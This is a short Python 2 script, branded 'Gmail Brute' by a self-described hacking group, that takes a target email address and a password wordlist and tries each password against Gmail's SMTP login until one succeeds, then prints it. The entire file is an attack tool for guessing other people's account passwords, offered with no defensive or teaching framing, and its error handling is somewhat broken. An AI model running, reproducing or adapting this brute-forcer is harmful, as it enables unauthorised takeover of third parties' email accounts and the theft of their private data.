import smtplib
from os import system
import os
import sys
def hell():
                    mawar = "\033[31;m1"
                    susu1 = "\033[37;1m"
                    hole1 = "\033[32;1m"
                    os.system("clear")
                    os.system("figlet Gmail Brute")
                    print hole1+""
                    print "-----------------------"
                    print "Coded By @HackerSarthak"
                    print "Tools Bruteforce Gmail "
                    print "Indian Hacking Army"
                    print "Type passwords.txt For Wordlist\n"   

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Trying Password :" + password
                            break
                else:
                        print mawar+"-->[!] Trying Password :" + password


